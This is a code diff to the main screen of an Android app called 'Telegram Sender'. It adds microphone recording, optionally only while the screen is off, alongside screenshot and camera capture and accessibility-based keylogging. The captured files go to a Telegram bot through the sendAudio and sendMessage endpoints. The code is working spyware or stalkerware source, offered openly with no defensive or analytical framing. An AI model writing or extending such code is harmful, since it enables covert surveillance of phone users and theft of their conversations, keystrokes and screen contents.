@@ -13,12 +13,17 @@ import androidx.appcompat.app.AppCompatActivity
 import android.widget.Toast
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.FormBody
 import java.io.IOException
+
+import android.view.View
+import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
 
 class MainActivity : AppCompatActivity() {
 
@@ -29,6 +34,9 @@ class MainActivity : AppCompatActivity() {
     private lateinit var statusText: TextView
     private lateinit var cameraSwitch: Switch
     private lateinit var screenshotIntervalEdit: EditText
+    private lateinit var audioSwitch: Switch
+    private lateinit var audioDurationEdit: EditText
+    private lateinit var screenOffOnlySwitch: Switch
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -41,7 +49,16 @@ class MainActivity : AppCompatActivity() {
         statusText = findViewById(R.id.statusText)
         cameraSwitch = findViewById(R.id.cameraSwitch)
         screenshotIntervalEdit = findViewById(R.id.screenshotIntervalEdit)
+        audioSwitch = findViewById(R.id.audioSwitch)
+        audioDurationEdit = findViewById(R.id.audioDurationEdit)
+        screenOffOnlySwitch = findViewById(R.id.screenOffOnlySwitch)
         
+        audioSwitch.setOnCheckedChangeListener { _, isChecked ->
+            val visibility = if (isChecked) View.VISIBLE else View.GONE
+            audioDurationEdit.visibility = visibility
+            screenOffOnlySwitch.visibility = visibility
+        }
+
         // ... (reuse screenshotButton logic) ...
         val screenshotButton = findViewById<Button>(R.id.screenshotButton)
         screenshotButton.text = "Enable Accessibility Service"
@@ -53,44 +70,122 @@ class MainActivity : AppCompatActivity() {
         loadSavedValues()
         updateStatus()
 
-        // ... (Xiaomi check) ...
+        // ... (Xiaomi & Tests) ...
         if (android.os.Build.MANUFACTURER.equals("Xiaomi", ignoreCase = true)) {
             Toast.makeText(this, "MIUI Detected: Please enable 'Autostart' and Lock the app in Recents to prevent stopping.", Toast.LENGTH_LONG).show()
         }
 
         findViewById<Button>(R.id.testConnectionButton).setOnClickListener {
+             // ... existing test logic ...
+             val token = botTokenEdit.text.toString().trim()
+             val chatId = chatIdEdit.text.toString().trim()
+             if (token.isEmpty() || chatId.isEmpty()) {
+                Toast.makeText(this, "Please enter Bot Token and Chat ID", Toast.LENGTH_SHORT).show()
+                return@setOnClickListener
+            }
+             Toast.makeText(this, "Sending Test Message...", Toast.LENGTH_SHORT).show()
+             val client = OkHttpClient()
+             CoroutineScope(Dispatchers.IO).launch {
+                try {
+                    val url = "https://api.telegram.org/bot$token/sendMessage"
+                    val body = FormBody.Builder().add("chat_id", chatId).add("text", "Test Message").build()
+                    val request = Request.Builder().url(url).post(body).build()
+                    client.newCall(request).execute().use { response ->
+                         withContext(Dispatchers.Main) {
+                            if (response.isSuccessful) Toast.makeText(this@MainActivity, "Success!", Toast.LENGTH_LONG).show()
+                            else Toast.makeText(this@MainActivity, "Failed: ${response.code}", Toast.LENGTH_LONG).show()
+                         }
+                    }
+                } catch(e:Exception) { withContext(Dispatchers.Main) { Toast.makeText(this@MainActivity, "Error: ${e.message}", Toast.LENGTH_LONG).show() } }
+             }
+        }
+
+        val testAudioBtn = findViewById<Button>(R.id.testAudioButton)
+        testAudioBtn.setOnClickListener {
+            testAudioBtn.isEnabled = false
+            testAudioBtn.text = "Initializing..."
+            
             val token = botTokenEdit.text.toString().trim()
             val chatId = chatIdEdit.text.toString().trim()
             
             if (token.isEmpty() || chatId.isEmpty()) {
-                Toast.makeText(this, "Please enter Bot Token and Chat ID", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this, "Creds missing", Toast.LENGTH_SHORT).show()
+                testAudioBtn.isEnabled = true
+                testAudioBtn.text = "Test Audio (Record 5s & Send)"
                 return@setOnClickListener
             }
             
-            Toast.makeText(this, "Sending Test Message...", Toast.LENGTH_SHORT).show()
+            stopService(Intent(this, MonitorService::class.java))
+            Toast.makeText(this, "Stopping BG Service...", Toast.LENGTH_SHORT).show()
             
-            val client = OkHttpClient()
+            if (android.os.Build.VERSION.SDK_INT >= 23 && checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                requestPermissions(arrayOf(android.Manifest.permission.RECORD_AUDIO), 102)
+                testAudioBtn.isEnabled = true
+                testAudioBtn.text = "Test Audio (Record 5s & Send)"
+                return@setOnClickListener
+            }
+            
             CoroutineScope(Dispatchers.IO).launch {
+                delay(2000) 
+                
+                withContext(Dispatchers.Main) { 
+                    testAudioBtn.text = "Recording..." 
+                    Toast.makeText(this@MainActivity, "Recording NOW...", Toast.LENGTH_SHORT).show()
+                }
+                
+                var mr: android.media.MediaRecorder? = null
+                val file = java.io.File(cacheDir, "test_audio.3gp") 
+                
                 try {
-                    val url = "https://api.telegram.org/bot$token/sendMessage"
-                    val body = FormBody.Builder()
-                        .add("chat_id", chatId)
-                        .add("text", "Test Message from Telegram Sender App!\nEverything is working fine.")
+                    mr = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) android.media.MediaRecorder(this@MainActivity) else android.media.MediaRecorder()
+                    
+                    mr.apply {
+                        setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
+                        setOutputFormat(android.media.MediaRecorder.OutputFormat.THREE_GPP) 
+                        setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AMR_NB)     
+                        setOutputFile(file.absolutePath)
+                        prepare()
+                        start()
+                    }
+                    
+                    delay(5000)
+                    
+                    try { mr.stop() } catch(e:Exception){}
+                    mr.release()
+                    mr = null
+                    
+                    withContext(Dispatchers.Main) { 
+                        testAudioBtn.text = "Sending..."
+                        Toast.makeText(this@MainActivity, "Sending...", Toast.LENGTH_SHORT).show() 
+                    }
+                    
+                    val client = OkHttpClient()
+                    val url = "https://api.telegram.org/bot$token/sendAudio"
+                    val requestBody = okhttp3.MultipartBody.Builder()
+                        .setType(okhttp3.MultipartBody.FORM)
+                        .addFormDataPart("chat_id", chatId)
+                        .addFormDataPart("audio", "test.3gp",
+                            file.readBytes().toRequestBody("audio/3gpp".toMediaTypeOrNull(), 0, file.length().toInt()))
                         .build()
-                    val request = Request.Builder().url(url).post(body).build()
+                    val request = Request.Builder().url(url).post(requestBody).build()
                     
                     client.newCall(request).execute().use { response ->
-                        withContext(Dispatchers.Main) {
-                            if (response.isSuccessful) {
-                                Toast.makeText(this@MainActivity, "Success! Message Sent.", Toast.LENGTH_LONG).show()
-                            } else {
-                                Toast.makeText(this@MainActivity, "Failed: ${response.code} ${response.message}", Toast.LENGTH_LONG).show()
-                            }
-                        }
+                         withContext(Dispatchers.Main) {
+                            if (response.isSuccessful) Toast.makeText(this@MainActivity, "SENT SUCCESS!", Toast.LENGTH_LONG).show()
+                            else Toast.makeText(this@MainActivity, "Send Fail: ${response.code}", Toast.LENGTH_LONG).show()
+                         }
                     }
-                } catch (e: Exception) {
+                    
+                } catch(e:Exception) {
+                     withContext(Dispatchers.Main) { 
+                        Toast.makeText(this@MainActivity, "Rec Error: ${e.message}", Toast.LENGTH_LONG).show() 
+                     }
+                     e.printStackTrace()
+                } finally {
+                    mr?.release()
                     withContext(Dispatchers.Main) {
-                        Toast.makeText(this@MainActivity, "Error: ${e.message}", Toast.LENGTH_LONG).show()
+                        testAudioBtn.isEnabled = true
+                        testAudioBtn.text = "Test Audio (Record 5s & Send)"
                     }
                 }
             }
@@ -101,46 +196,74 @@ class MainActivity : AppCompatActivity() {
             val chatId = chatIdEdit.text.toString().trim()
             val sendCamera = cameraSwitch.isChecked
             val intervalStr = screenshotIntervalEdit.text.toString().trim()
-            
             val interval = intervalStr.toLongOrNull() ?: 10L
+            
+            // Audio settings
+            val sendAudio = audioSwitch.isChecked
+            val audioDurationStr = audioDurationEdit.text.toString().trim()
+            val audioDuration = audioDurationStr.toLongOrNull() ?: 60L
+            val audioScreenOff = screenOffOnlySwitch.isChecked
+
             if (interval < 5) {
-                 Toast.makeText(this, "Interval must be at least 5 seconds", Toast.LENGTH_SHORT).show()
+                 Toast.makeText(this, "Screenshot Interval must be at least 5 seconds", Toast.LENGTH_SHORT).show()
                  return@setOnClickListener
             }
-
             if (token.isEmpty() || chatId.isEmpty()) {
                 statusText.text = "Please enter values"
                 return@setOnClickListener
             }
 
+            // Permissions
+            val permissions = mutableListOf<String>()
             if (sendCamera && android.os.Build.VERSION.SDK_INT >= 23) {
                  if (checkSelfPermission(android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                     requestPermissions(arrayOf(android.Manifest.permission.CAMERA), 101)
-                     return@setOnClickListener
+                     permissions.add(android.Manifest.permission.CAMERA)
                  }
             }
+            if (sendAudio && android.os.Build.VERSION.SDK_INT >= 23) {
+                 if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                     permissions.add(android.Manifest.permission.RECORD_AUDIO)
+                 }
+            }
+            
+            if (permissions.isNotEmpty()) {
+                requestPermissions(permissions.toTypedArray(), 101)
+                return@setOnClickListener
+            }
 
-            saveValues(token, chatId, sendCamera, interval)
+            saveValues(token, chatId, sendCamera, interval, sendAudio, audioDuration, audioScreenOff)
+            
+            // Start Independent Monitor Service (Audio/Camera)
+            val monitorIntent = Intent(this, MonitorService::class.java)
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                startForegroundService(monitorIntent)
+            } else {
+                startService(monitorIntent)
+            }
             
             if (isAccessibilityServiceEnabled()) {
-                statusText.text = "Service is Active (managed by System)"
-                // We might want to notify service of config change, but it reloads prefs every loop
-                Toast.makeText(this, "Settings Saved. Service will update shortly.", Toast.LENGTH_SHORT).show()
+                statusText.text = "All Services Active"
+                Toast.makeText(this, "Monitor Service Started + Accessibility Active", Toast.LENGTH_SHORT).show()
             } else {
-                statusText.text = "Please Enable Accessibility First"
-                Toast.makeText(this, "Enable 'Telegram Sender' in Accessibility Settings", Toast.LENGTH_LONG).show()
+                statusText.text = "Monitor Service Active. Accessibility Pending."
+                Toast.makeText(this, "Audio/Camera Started. Please Enable Accessibility for Keylogs/Screenshots.", Toast.LENGTH_LONG).show()
                 val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                 startActivity(intent)
             }
         }
-
+        
+        // ... stop button, logs buttons same as before ... 
         stopButton.setOnClickListener {
+            // Stop Monitor Service
+            stopService(Intent(this, MonitorService::class.java))
+            
             if (isAccessibilityServiceEnabled()) {
-                Toast.makeText(this, "Disable service in Accessibility Settings to stop", Toast.LENGTH_LONG).show()
+                Toast.makeText(this, "Disable service in Accessibility Settings to stop Keylogging", Toast.LENGTH_LONG).show()
                 val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                 startActivity(intent)
             } else {
-                statusText.text = "Service Stopped"
+                statusText.text = "Services Stopped"
+                Toast.makeText(this, "Monitor Service Stopped", Toast.LENGTH_SHORT).show()
             }
         }
         
@@ -232,16 +355,26 @@ class MainActivity : AppCompatActivity() {
         cameraSwitch.isChecked = pref.getBoolean("sendCamera", false)
         val interval = pref.getLong("screenshotInterval", 10L)
         screenshotIntervalEdit.setText(interval.toString())
+        
+        audioSwitch.isChecked = pref.getBoolean("sendAudio", false)
+        audioDurationEdit.setText(pref.getLong("audioDuration", 60L).toString())
+        screenOffOnlySwitch.isChecked = pref.getBoolean("audioScreenOff", false)
+        
+        // Trigger visibility
+        val visibility = if (audioSwitch.isChecked) View.VISIBLE else View.GONE
+        audioDurationEdit.visibility = visibility
+        screenOffOnlySwitch.visibility = visibility
     }
 
-    private fun saveValues(token: String, chatId: String, sendCamera: Boolean, interval: Long) {
+    private fun saveValues(token: String, chatId: String, sendCamera: Boolean, interval: Long, sendAudio: Boolean, audioDuration: Long, audioScreenOff: Boolean) {
         val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
         pref.edit().putString("token", token)
             .putString("chatId", chatId)
             .putBoolean("sendCamera", sendCamera)
             .putLong("screenshotInterval", interval)
+            .putBoolean("sendAudio", sendAudio)
+            .putLong("audioDuration", audioDuration)
+            .putBoolean("audioScreenOff", audioScreenOff)
             .apply()
     }
 }
-
-
